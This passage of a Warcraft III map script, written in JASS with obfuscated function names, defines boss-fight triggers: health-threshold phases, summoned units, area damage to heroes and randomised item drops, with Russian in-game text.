call ForGroupBJ(SR,function Bfo)
call DestroyGroup(SR)
call SetUnitInvulnerable(GetTriggerUnit(),false)
call SetUnitOwner(Kx,Player(11),true)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bfq takes nothing returns nothing
set db=CreateTrigger()
call TriggerRegisterUnitEvent(db,Kx,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(db,Condition(function Bfc))
call TriggerAddAction(db,function Bfp)
endfunction
function Bfr takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=Tt[13]) then
return false
endif
return true
endfunction
function Bfs takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bft takes nothing returns boolean
if not (UnitHasBuffBJ(GetEnumUnit(),$42303539)==true) then
return false
endif
return true
endfunction
function Bfu takes nothing returns nothing
if Bft() then
call KillUnit(GetEnumUnit())
else
endif
endfunction
function Bfv takes nothing returns nothing
local unit NQ
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),Tt[13])
set Tt[13]=Tt[13]-5.
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Gatekeepers_Pact.mdx",GetTriggerUnit(),"chest"))
set NQ=CreateUnitAtLoc(Player(10),$68303739,GetRectCenter(FW),0)
call UnitAddAbility(NQ,$41304839)
call IssueImmediateOrder(NQ,"howlofterror")
call nD(NQ,2)
set NQ=null
call TriggerSleepAction(3.)
set SR=GetUnitsInRectMatching(FW,Condition(function Bfs))
call ForGroupBJ(SR,function Bfu)
call DestroyGroup(SR)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bfw takes nothing returns nothing
set dc=CreateTrigger()
call TriggerRegisterUnitEvent(dc,Kx,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(dc,Condition(function Bfr))
call TriggerAddAction(dc,function Bfv)
endfunction
function Bfx takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=Tt[14]) then
return false
endif
return true
endfunction
function Bfy takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bfz takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bf0 takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetEnumUnit())-9000.)
endfunction
function Bf1 takes nothing returns nothing
set Vz=GetUnitLoc(GetEnumUnit())
call ForGroupBJ(GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bfz)),function Bf0)
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\Singularity II Red.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
call RemoveLocation(Vz)
endfunction
function Bf2 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bf3 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bf4 takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetEnumUnit())-9000.)
endfunction
function Bf5 takes nothing returns nothing
set Vz=GetUnitLoc(GetEnumUnit())
call ForGroupBJ(GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bf3)),function Bf4)
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\Singularity II Red.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
call RemoveLocation(Vz)
endfunction
function Bf6 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bf7 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bf8 takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetEnumUnit())-9000.)
endfunction
function Bf9 takes nothing returns nothing
set Vz=GetUnitLoc(GetEnumUnit())
call ForGroupBJ(GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bf7)),function Bf8)
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\Singularity II Red.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
call RemoveLocation(Vz)
endfunction
function BgB takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),Tt[14])
set Tt[14]=Tt[14]-15.
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Desecrate_JFI.mdx",GetTriggerUnit(),"chest"))
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Desecrate_JFI.mdx",GetTriggerUnit(),"chest"))
call TriggerSleepAction(1.7)
set SR=GetUnitsInRectMatching(FW,Condition(function Bfy))
call ForGroupBJ(SR,function Bf1)
call DestroyGroup(SR)
call TriggerSleepAction(1.7)
set SR=GetUnitsInRectMatching(FW,Condition(function Bf2))
call ForGroupBJ(SR,function Bf5)
call DestroyGroup(SR)
call TriggerSleepAction(2.)
set SR=GetUnitsInRectMatching(FW,Condition(function Bf6))
call ForGroupBJ(SR,function Bf9)
call DestroyGroup(SR)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function BgC takes nothing returns nothing
set dd=CreateTrigger()
call TriggerRegisterUnitEvent(dd,Kx,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(dd,Condition(function Bfx))
call TriggerAddAction(dd,function BgB)
endfunction
function BgD takes nothing returns nothing
call SetUnitLifePercentBJ(GetEnumUnit(),GetUnitLifePercent(GetEnumUnit())-8)
endfunction
function BgE takes nothing returns nothing
local group V9=CreateGroup()
local boolexpr df=Condition(function mv)
call GroupEnumUnitsInRect(V9,FW,df)
call ForGroup(V9,function BgD)
call DestroyGroup(V9)
call DestroyBoolExpr(df)
set V9=null
set df=null
endfunction
function BgF takes nothing returns nothing
set de=CreateTrigger()
call DisableTrigger(de)
call TriggerRegisterTimerEventPeriodic(de,5.)
call TriggerAddAction(de,function BgE)
endfunction
function BgG takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BgH takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(12.)
set SR=GetUnitsInRectMatching(FW,Condition(function BgG))
set V0=GetUnitLoc(GroupPickRandomUnit(SR))
call CreateNUnitsAtLoc(1,$6E303842,GetOwningPlayer(GetTriggerUnit()),V0,Rs[2])
set WS[2]=GetLastCreatedUnit()
call UnitApplyTimedLifeBJ(7.,$42544C46,WS[2])
call RemoveLocation(V0)
call DestroyGroup(SR)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function BgI takes nothing returns nothing
set dg=CreateTrigger()
call DisableTrigger(dg)
call TriggerRegisterUnitEvent(dg,Kx,EVENT_UNIT_DAMAGED)
call TriggerAddAction(dg,function BgH)
endfunction
function BgJ takes nothing returns boolean
if GetUnitTypeId(GetFilterUnit())==$6E736E70 then
return true
endif
return false
endfunction
function BgK takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit Mc
local location No
local group Np
local boolexpr Nt
if GetUnitLifePercent(Hu)<=Tt[15] then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(Hu,Tt[15])
set Tt[15]=Tt[15]-4.
if Tt[15]<=50. then
set No=Location(5091,12064)
set Mc=CreateUnitAtLoc(Player(10),$6E736E70,No,0)
call UnitAddAbility(Mc,$41637269)
call UnitAddAbility(Mc,$41304451)
call UnitAddAbility(Mc,$41304456)
call SetUnitAbilityLevel(Mc,$41304456,2)
call UnitApplyTimedLife(Mc,$42544C46,200.)
call SetUnitVertexColor(Mc,0,0,0,100)
set No=Location(6687,12064)
set Mc=CreateUnitAtLoc(Player(10),$6E736E70,No,0)
call UnitAddAbility(Mc,$41637269)
call UnitAddAbility(Mc,$41304451)
call UnitAddAbility(Mc,$41304456)
call SetUnitAbilityLevel(Mc,$41304456,2)
call UnitApplyTimedLife(Mc,$42544C46,200.)
call SetUnitVertexColor(Mc,0,0,0,100)
else
set No=Location(6687,12064)
set Mc=CreateUnitAtLoc(Player(10),$6E736E70,No,0)
call UnitAddAbility(Mc,$41637269)
call UnitAddAbility(Mc,$41304451)
call UnitAddAbility(Mc,$41304456)
call SetUnitAbilityLevel(Mc,$41304456,2)
call UnitApplyTimedLife(Mc,$42544C46,200.)
call SetUnitVertexColor(Mc,0,0,0,100)
endif
call RemoveLocation(No)
set No=null
set Hu=null
set Mc=null
set Np=CreateGroup()
set Nt=Condition(function BgJ)
call GroupEnumUnitsInRect(Np,FW,Nt)
if CountUnitsInGroup(Np)>=4 then
call SetUnitLifePercentBJ(Hu,100)
set Tt[10]=90.
set Tt[11]=85.
set Tt[12]=75.
set Tt[13]=98.
set Tt[14]=80.
set Tt[15]=97.
endif
call DestroyGroup(Np)
call DestroyBoolExpr(Nt)
set Np=null
set Nt=null
call EnableTrigger(GetTriggeringTrigger())
endif
set Hu=null
endfunction
function BgL takes nothing returns nothing
set dh=CreateTrigger()
call DisableTrigger(dh)
call TriggerRegisterUnitEvent(dh,Kx,EVENT_UNIT_DAMAGED)
call TriggerAddAction(dh,function BgK)
endfunction
function BgM takes nothing returns nothing
local unit Hu
local integer NT=1
local integer L9
call ShowUnit(Io,true)
set Hu=CreateUnitAtLoc(Player(PLAYER_NEUTRAL_PASSIVE),$6E303650,GetRectCenter(FW),0)
loop
set L9=GetRandomInt(1,13)
if L9==1 then
call AddItemToStock(Hu,$49305630,1,1)
elseif L9==2 then
call AddItemToStock(Hu,$49305632,1,1)
elseif L9==3 then
call AddItemToStock(Hu,$49305636,1,1)
elseif L9==4 then
call AddItemToStock(Hu,$49305634,1,1)
elseif L9==5 then
call AddItemToStock(Hu,$49305559,1,1)
elseif L9==6 then
call AddItemToStock(Hu,$49305556,1,1)
elseif L9==7 then
call AddItemToStock(Hu,$49305557,1,1)
elseif L9==8 then
call AddItemToStock(Hu,$49304E45,1,1)
elseif L9==9 then
call AddItemToStock(Hu,$49305A45,1,1)
endif
set NT=NT+1
exitwhen NT>1+MK
endloop
if GetUnitAbilityLevel(GetTriggerUnit(),$41304456)>=1 then
call BJDebugMsg("|c00ff00ffХард Джек мёртв!")
set NT=1
loop
set L9=GetRandomInt(1,5)
if L9==1 then
call AddItemToStock(Hu,$4930594B,1,1)
elseif L9==2 then
call AddItemToStock(Hu,$49305949,1,1)
elseif L9==3 then
call AddItemToStock(Hu,$49305948,1,1)
elseif L9==4 then
call AddItemToStock(Hu,$4930594C,1,1)
endif
set NT=NT+1
exitwhen NT>1+MK
endloop
endif
set Hu=null
call DisableTrigger(dj)
endfunction
function BgN takes nothing returns nothing
set di=CreateTrigger()
call TriggerRegisterUnitEvent(di,Kx,EVENT_UNIT_DEATH)
call TriggerAddAction(di,function BgM)
endfunction
function BgO takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=Tt[7]) then
return false
endif
return true
endfunction
function BgP takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),Tt[7])
set Tt[7]=Tt[7]-15.
call SetUnitPositionLoc(Lt,GetRectCenter(Fo))
call SetUnitFacing(GetTriggerUnit(),180.)
call PauseUnit(GetTriggerUnit(),true)
call SetUnitInvulnerable(Lt,true)
call TriggerSleepAction(3.)
set V0=GetRectCenter(Fk)
call CreateNUnitsAtLoc(2,$65303058,Player(10),V0,bj_UNIT_FACING)
call CreateNUnitsAtLoc(3,$65303043,Player(10),V0,bj_UNIT_FACING)
call CreateNUnitsAtLoc(3,$65303059,Player(10),V0,bj_UNIT_FACING)
call RemoveLocation(V0)
call TriggerSleepAction(20.)
call PauseUnit(GetTriggerUnit(),false)
call SetUnitInvulnerable(Lt,false)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function BgQ takes nothing returns nothing
set dk=CreateTrigger()
call TriggerRegisterUnitEvent(dk,Lt,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(dk,Condition(function BgO))
call TriggerAddAction(dk,function BgP)
endfunction
function BgR takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=Tt[8]) then
return false
endif
return true
endfunction
function BgS takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),Tt[8])
set Tt[8]=Tt[8]-33.
call SetUnitPositionLoc(Lt,GetRectCenter(Fo))
call SetUnitFacing(GetTriggerUnit(),180.)
call SetUnitInvulnerable(Lt,true)
call PauseUnit(GetTriggerUnit(),true)
call TriggerSleepAction(3.)
set V0=GetRectCenter(Fk)
set Vz=PolarProjectionBJ(V0,400.,90.)
set Ub=PolarProjectionBJ(V0,400.,270.)
call CreateNUnitsAtLoc(1,$6530305A,Player(10),Vz,bj_UNIT_FACING)
call CreateNUnitsAtLoc(1,$6530305A,Player(10),Ub,bj_UNIT_FACING)
call RemoveLocation(V0)
call RemoveLocation(Vz)
call RemoveLocation(Ub)
call TriggerSleepAction(15.)
call PauseUnit(GetTriggerUnit(),false)
call SetUnitInvulnerable(Lt,false)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function BgT takes nothing returns nothing
set dl=CreateTrigger()
call TriggerRegisterUnitEvent(dl,Lt,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(dl,Condition(function BgR))
call TriggerAddAction(dl,function BgS)
endfunction
function BgU takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=Tt[9]) then
return false
endif
return true
endfunction
function BgV takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),Tt[9])
set Tt[9]=Tt[9]-30.
call SetUnitPositionLoc(Lt,GetRectCenter(Fo))
call SetUnitFacing(GetTriggerUnit(),180.)
call SetUnitInvulnerable(Lt,true)
call PauseUnit(GetTriggerUnit(),true)
call CreateTextTagUnitBJ("Он здесь!",GetTriggerUnit(),0,15.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call TriggerSleepAction(3.)
set V0=GetRectCenter(Fk)
call CreateNUnitsAtLoc(1,$65303130,Player(10),V0,bj_UNIT_FACING)
call RemoveLocation(V0)
call TriggerSleepAction(10.)
call PauseUnit(GetTriggerUnit(),false)
call SetUnitInvulnerable(Lt,false)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function BgW takes nothing returns nothing
set dm=CreateTrigger()
call TriggerRegisterUnitEvent(dm,Lt,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(dm,Condition(function BgU))
call TriggerAddAction(dm,function BgV)
endfunction
function BgX takes nothing returns boolean
if not (GetOwningPlayer(GetTriggerUnit())==Player(11)) then
return false
endif
return true
endfunction
function BgY takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(5.)
if BgX() then
call SetUnitVertexColor(GetTriggerUnit(),255,0,255,255)
call TriggerSleepAction(2)
call UnitAddAbilityBJ($41313439,GetTriggerUnit())
call SetUnitVertexColor(GetTriggerUnit(),0,0,0,255)
call TriggerSleepAction(6.)
call UnitRemoveAbilityBJ($41313439,GetTriggerUnit())
call SetUnitVertexColor(GetTriggerUnit(),255,255,255,255)
call TriggerSleepAction(15.)
call EnableTrigger(GetTriggeringTrigger())
else
call EnableTrigger(GetTriggeringTrigger())
endif
endfunction
function BgZ takes nothing returns nothing
set dn=CreateTrigger()
call TriggerRegisterUnitEvent(dn,Lt,EVENT_UNIT_DAMAGED)
call TriggerAddAction(dn,function BgY)
endfunction
function Bga takes nothing returns nothing
local integer L9=0
local item Mc
call DisableTrigger(cm)
call ModifyGateBJ(bj_GATEOPERATION_CLOSE,HX)
loop
if nO(MT[L9],$49303448) then
call RemoveItem(nP(MT[L9],$49303448))
set Mc=nQ($6C757265,MT[L9])
call SetItemUserData(Mc,GetPlayerId(GetOwningPlayer(MT[L9]))+1)
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",MT[L9],"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",MT[L9],"chest"))
set Mc=null
endif
set L9=L9+1
exitwhen L9>7
endloop
endfunction
function Bgb takes nothing returns nothing
set do=CreateTrigger()
call TriggerRegisterUnitEvent(do,Lt,EVENT_UNIT_DEATH)
call TriggerAddAction(do,function Bga)
endfunction
function Bgc takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(5.)
set Ub=GetRandomLocInRect(Fd)
call CreateNUnitsAtLoc(1,$6E30374E,Player(10),Ub,bj_UNIT_FACING)
call RemoveLocation(Ub)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bgd takes nothing returns nothing
set dp=CreateTrigger()
call TriggerRegisterUnitEvent(dp,LF,EVENT_UNIT_DAMAGED)
call TriggerAddAction(dp,function Bgc)
endfunction
function Bge takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(25.)
set Ub=GetRandomLocInRect(Fd)
call CreateNUnitsAtLoc(1,$68303539,Player(10),Ub,bj_UNIT_FACING)
call RemoveLocation(Ub)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bgf takes nothing returns nothing
set dq=CreateTrigger()
call TriggerRegisterUnitEvent(dq,LF,EVENT_UNIT_DAMAGED)
call TriggerAddAction(dq,function Bge)
endfunction
function Bgg takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=Tt[0]) then
return false
endif
return true
endfunction
function Bgh takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bgi takes nothing returns nothing
call SetUnitPositionLoc(GetEnumUnit(),V0)
call SetUnitLifePercentBJ(GetEnumUnit(),GetUnitLifePercent(GetEnumUnit())-25.)
endfunction
function Bgj takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bgk takes nothing returns nothing
call SetUnitPositionLoc(GetEnumUnit(),V0)
call SetUnitLifePercentBJ(GetEnumUnit(),GetUnitLifePercent(GetEnumUnit())-25.)
endfunction
function Bgl takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bgm takes nothing returns nothing
call SetUnitPositionLoc(GetEnumUnit(),V0)
call SetUnitLifePercentBJ(GetEnumUnit(),GetUnitLifePercent(GetEnumUnit())-25.)
endfunction
function Bgn takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bgo takes nothing returns nothing
call SetUnitPositionLoc(GetEnumUnit(),V0)
call SetUnitLifePercentBJ(GetEnumUnit(),GetUnitLifePercent(GetEnumUnit())-25.)
endfunction
function Bgp takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),Tt[0])
set Tt[0]=Tt[0]-25.
set V0=Location(-830.,-23730.)
call SetUnitVertexColor(GetTriggerUnit(),255,0,255,255)
set SR=GetUnitsInRangeOfLocMatching(1200.,V0,Condition(function Bgh))
call ForGroupBJ(SR,function Bgi)
call RemoveLocation(V0)
call DestroyGroup(SR)
call TriggerSleepAction(1.)
set V0=Location(-830.,-23730.)
set SR=GetUnitsInRangeOfLocMatching(1200.,V0,Condition(function Bgj))
call ForGroupBJ(SR,function Bgk)
call RemoveLocation(V0)
call DestroyGroup(SR)
call TriggerSleepAction(1.)
set V0=Location(-830.,-23730.)
set SR=GetUnitsInRangeOfLocMatching(1200.,V0,Condition(function Bgl))
call ForGroupBJ(SR,function Bgm)
call RemoveLocation(V0)
call DestroyGroup(SR)
call TriggerSleepAction(1.)
set V0=Location(-830.,-23730.)
set SR=GetUnitsInRangeOfLocMatching(1200.,V0,Condition(function Bgn))
call ForGroupBJ(SR,function Bgo)
call RemoveLocation(V0)
call DestroyGroup(SR)
call SetUnitVertexColor(GetTriggerUnit(),255,255,255,255)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bgq takes nothing returns nothing
set dr=CreateTrigger()
call TriggerRegisterUnitEvent(dr,LF,EVENT_UNIT_DAMAGED)
call TriggerAddCondition(dr,Condition(function Bgg))
call TriggerAddAction(dr,function Bgp)
endfunction
function Bgr takes nothing returns boolean
if not (GetOwningPlayer(GetTriggerUnit())==Player(11)) then
return false
endif
return true
endfunction
function Bgs takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(15.)
if Bgr() then
set Ub=GetRectCenter(Fc)
call CreateNUnitsAtLoc(1,$6E30374D,Player(6),Ub,bj_UNIT_FACING)
call IssueTargetOrderBJ(LE,"attack",GetLastCreatedUnit())
call UnitApplyTimedLifeBJ(6.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(Ub)
else
endif
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bgt takes nothing returns nothing
set ds=CreateTrigger()
call TriggerRegisterUnitEvent(ds,LE,EVENT_UNIT_ATTACKED)
call TriggerAddAction(ds,function Bgs)
endfunction
function Bgu takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6E30374D) then
return false
endif
if not (GetUnitTypeId(GetAttacker())==$6E303749) then
return false
endif
return true
endfunction
function Bgv takes nothing returns nothing
call RemoveUnit(GetTriggerUnit())
call SetUnitLifePercentBJ(GetAttacker(),100)
endfunction
function Bgw takes nothing returns nothing
set dt=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(dt,EVENT_PLAYER_UNIT_ATTACKED)
call TriggerAddCondition(dt,Condition(function Bgu))
call TriggerAddAction(dt,function Bgv)
endfunction
function Bgx takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=Tt[2]) then
return false
endif
return true
endfunction
function Bgy takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),Tt[2])
set Tt[2]=Tt[2]-25.
call SetUnitInvulnerable(LE,true)
call SetUnitOwner(LE,Player(10),true)
set Ub=GetRectCenter(FZ)
call SetUnitPositionLoc(GetTriggerUnit(),Ub)
call SetUnitFacing(GetTriggerUnit(),I2R(GetRandomInt(1,360)))
call IssuePointOrderLocBJ(GetTriggerUnit(),"carrionswarm",Ub)
call RemoveLocation(Ub)
call TriggerSleepAction(2.)
set Ub=GetRectCenter(FZ)
call SetUnitPositionLoc(GetTriggerUnit(),Ub)
call SetUnitFacing(GetTriggerUnit(),I2R(GetRandomInt(1,360)))
call IssuePointOrderLocBJ(GetTriggerUnit(),"carrionswarm",Ub)
call RemoveLocation(Ub)
call TriggerSleepAction(2.)
set Ub=GetRectCenter(FZ)
call SetUnitPositionLoc(GetTriggerUnit(),Ub)
call SetUnitFacing(GetTriggerUnit(),I2R(GetRandomInt(1,360)))
call IssuePointOrderLocBJ(GetTriggerUnit(),"carrionswarm",Ub)
call RemoveLocation(Ub)
call TriggerSleepAction(2.)
set Ub=GetRectCenter(FZ)
call SetUnitPositionLoc(GetTriggerUnit(),Ub)
call SetUnitFacing(GetTriggerUnit(),I2R(GetRandomInt(1,360)))
call IssuePointOrderLocBJ(GetTriggerUnit(),"carrionswarm",Ub)
call RemoveLocation(Ub)
call TriggerSleepAction(2.)
call SetUnitInvulnerable(LE,false)
call SetUnitOwner(LE,Player(11),true)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bgz takes nothing returns nothing
set du=CreateTrigger()
call TriggerRegisterUnitEvent(du,LE,EVENT_UNIT_ATTACKED)
call TriggerAddCondition(du,Condition(function Bgx))
call TriggerAddAction(du,function Bgy)
endfunction
function Bg0 takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
if not (GetUnitLevel(GetTriggerUnit())>=40) then
return false
endif
return true
endfunction
function Bg1 takes nothing returns nothing
if Bg0() then
set Ub=GetRectCenter(FX)
call SetUnitPositionLoc(GetTriggerUnit(),Ub)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),Ub,0)
call SetUnitLifePercentBJ(Lk,100)
call RemoveLocation(Ub)
else
call CreateTextTagUnitBJ("Вход с |c00ff000040|r уровня!",GetTriggerUnit(),0,15.,100.,100.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
endif
endfunction
function Bg2 takes nothing returns nothing
set Uq=CreateTrigger()
call DisableTrigger(Uq)
call TriggerRegisterEnterRectSimple(Uq,GG)
call TriggerAddAction(Uq,function Bg1)
endfunction
function Bg3 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(10.)
set Ub=GetUnitLoc(GetTriggerUnit())
call IssuePointOrderLocBJ(GetTriggerUnit(),"carrionswarm",Ub)
call RemoveLocation(Ub)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bg4 takes nothing returns nothing
set dv=CreateTrigger()
call TriggerRegisterUnitEvent(dv,Lk,EVENT_UNIT_DAMAGED)
call TriggerAddAction(dv,function Bg3)
endfunction
function Bg5 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bg6 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
set SR=GetUnitsInRectMatching(FX,Condition(function Bg5))
call IssueTargetOrderBJ(GroupPickRandomUnit(GetUnitsOfTypeIdAll($68303537)),"drain",GroupPickRandomUnit(SR))
call TriggerSleepAction(2)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bg7 takes nothing returns nothing
set dw=CreateTrigger()
call TriggerRegisterUnitEvent(dw,Lk,EVENT_UNIT_ATTACKED)
call TriggerAddAction(dw,function Bg6)
endfunction
function Bg8 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bg9 takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=I2R(Td[0])) then
return false
endif
return true
endfunction
function BhB takes nothing returns nothing
if Bg9() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(Td[0]))
set Td[0]=Td[0]-5
call CreateTextTagUnitBJ("Печать!",GetTriggerUnit(),0,15.,0.,100.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
set SR=GetUnitsInRectMatching(FL,Condition(function Bg8))
set dy=GroupPickRandomUnit(SR)
call SetUnitVertexColor(dy,0,255,255,100)
call DestroyGroup(SR)
call TriggerSleepAction(2)
set Vz=GetUnitLoc(dy)
call CreateNUnitsAtLoc(1,$6E303737,Player(10),Vz,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call IssueImmediateOrder(GetLastCreatedUnit(),"fanofknives")
call RemoveLocation(Vz)
call TriggerSleepAction(2)
set Vz=GetUnitLoc(dy)
call CreateNUnitsAtLoc(1,$6E303737,Player(10),Vz,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call IssueImmediateOrder(GetLastCreatedUnit(),"fanofknives")
call RemoveLocation(Vz)
call TriggerSleepAction(2)
set Vz=GetUnitLoc(dy)
call CreateNUnitsAtLoc(1,$6E303737,Player(10),Vz,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call IssueImmediateOrder(GetLastCreatedUnit(),"fanofknives")
call RemoveLocation(Vz)
call TriggerSleepAction(2)
set Vz=GetUnitLoc(dy)
call CreateNUnitsAtLoc(1,$6E303737,Player(10),Vz,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call IssueImmediateOrder(GetLastCreatedUnit(),"fanofknives")
call RemoveLocation(Vz)
call TriggerSleepAction(2)
set Vz=GetUnitLoc(dy)
call CreateNUnitsAtLoc(1,$6E303737,Player(10),Vz,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call IssueImmediateOrder(GetLastCreatedUnit(),"fanofknives")
call RemoveLocation(Vz)
call SetUnitVertexColor(dy,255,255,255,255)
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function BhC takes nothing returns nothing
set dx=CreateTrigger()
call TriggerRegisterUnitEvent(dx,K0,EVENT_UNIT_DAMAGED)
call TriggerAddAction(dx,function BhB)
endfunction
function BhD takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BhE takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=I2R(Td[1])) then
return false
endif
return true
endfunction
function BhF takes nothing returns nothing
if BhE() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(Td[1]))
set Td[1]=Td[1]-20
set SR=GetUnitsInRectMatching(FL,Condition(function BhD))
set Vz=GetUnitLoc(GroupPickRandomUnit(SR))
call CreateNUnitsAtLoc(1,$6E303734,Player(10),Vz,bj_UNIT_FACING)
call RemoveLocation(Vz)
set Vz=GetUnitLoc(GroupPickRandomUnit(SR))
